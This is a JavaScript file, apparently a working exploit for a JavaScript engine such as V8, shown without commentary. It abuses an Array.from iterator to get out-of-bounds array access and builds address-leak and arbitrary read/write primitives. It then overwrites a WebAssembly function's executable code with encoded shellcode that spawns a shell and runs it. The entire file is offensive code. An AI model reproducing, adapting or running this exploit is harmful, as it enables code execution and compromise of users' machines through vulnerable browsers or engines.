var bufs = [];
var objs = [];
var oobArray = [1.1];
var maxSize = 1028 * 8;
Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
  {
    counter : 0,
    next() {
      let result = 1.1;
	this.counter++;
      if (this.counter > maxSize) {
        oobArray.length = 1;
	for(let i=0;i<1000;i++){
		bufs.push(new ArrayBuffer(0x1234));
		let obj = {'a':0xaaaa,'b':0x9999};
		objs.push(obj);
	}
        return {done: true};
      } else {
        return {value: result, done: false};
      }
    }
  }
) });

var x = new ArrayBuffer(8);
var Float = new Float64Array(x);
var Int32 = new Uint32Array(x);

Int32[0] = 0x1234;
Int32[1] = 0x0;
var oob_buf_idx = 0;
for(let i=0;i<maxSize;i++){
	if( oobArray[i] == Float[0]){
		Int32[0] = 0xde00;
		oobArray[i] = Float[0];
		Int32[0] = 0;
		Int32[1] = 0xde00;
		oobArray[i-3] = Float[0];
		oob_buf_idx = i;
		break;
	}
}
Int32[0] = 0x0;
Int32[1] = 0xaaaa;
var oob_obj_idx = 0;
for(let i=0;i<maxSize;i++){
	if( oobArray[i] == Float[0]){
		Int32[1] = 0xbbbb;
		oobArray[i] = Float[0];
		oob_obj_idx = i;
		break;
	}
}


var target_buf_idx = -1;
for(let i=0;i<1000;i++){
	if(bufs[i].byteLength != 0x1234){
		target_buf_idx = i;	
		break;
	}
}

var target_obj_idx = -1;
for(let i=0;i<1000;i++){
	if(objs[i]['a'] != 0xaaaa){
		target_obj_idx = i;		
		break;
	}
}

function leakobj(a){
	objs[target_obj_idx]['a'] = a;
	return oobArray[oob_obj_idx ];
}
console.log(bufs[target_buf_idx].byteLength);


function Read(addr){
	oobArray[oob_buf_idx-1] = addr;
	oobArray[oob_buf_idx-2] = addr;
	var tmp = new Float64Array(bufs[target_buf_idx]);
	return tmp[0];
}
function Write(addr,val){
	oobArray[oob_buf_idx-1] = addr;
	oobArray[oob_buf_idx-2] = addr;
	var tmp = new Float64Array(bufs[target_buf_idx]);
	tmp[0] = val;
}

function itof(a){
	Int32[0] = a[1];
	Int32[1] = a[0];
	return Float[0];
}

function ftoi(val){
	Float[0] = val;
	return [Int32[0],Int32[1]];
}

function jit(){
}





var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
var f = wasmInstance.exports.main;
Float[0] = leakobj(f);
Int32[0] += 0x2f;
Float[0] = Read(Float[0]);
Int32[0] += 0x71;
Addr = Read(Float[0]);

Write(Addr,0);
Data = new Uint32Array(bufs[target_buf_idx]);
var i=0;

Data[i++]=3091753066;
Data[i++]=1852400175;
Data[i++]=1932472111;
Data[i++]=3884533840;
Data[i++]=23687784;
Data[i++]=607420673;
Data[i++]=16843009;
Data[i++]=1784084017;
Data[i++]=21519880;
Data[i++]=2303219430;
Data[i++]=1792160230;
Data[i++]=84891707;
Data[i++]=0;



f();










